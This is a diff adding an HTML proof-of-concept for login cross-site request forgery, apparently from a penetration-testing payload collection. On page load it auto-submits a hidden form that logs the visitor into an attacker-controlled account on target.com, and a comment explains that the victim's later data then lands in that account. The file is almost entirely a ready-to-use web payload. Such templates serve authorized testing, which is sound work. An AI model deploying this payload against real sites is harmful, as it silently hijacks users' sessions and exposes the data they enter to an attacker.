@@ -1,0 +1,13 @@
+<!doctype html>
+<!-- Login CSRF (guide §12): silently logs the victim into the ATTACKER's account. The victim then
+     operates inside the attacker's account (their saved data lands there, or seeds a chain).
+     Usually Low–Medium ALONE — escalate via what the victim does next. Authorized testing only. -->
+<html><head><meta charset="utf-8"></head>
+<body>
+<h3>loading…</h3>
+<form id="csrf" action="https://target.com/login" method="POST">
+  <input type="hidden" name="username" value="ATTACKER_TEST_ACCOUNT">
+  <input type="hidden" name="password" value="ATTACKER_TEST_PASSWORD">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+</body></html>
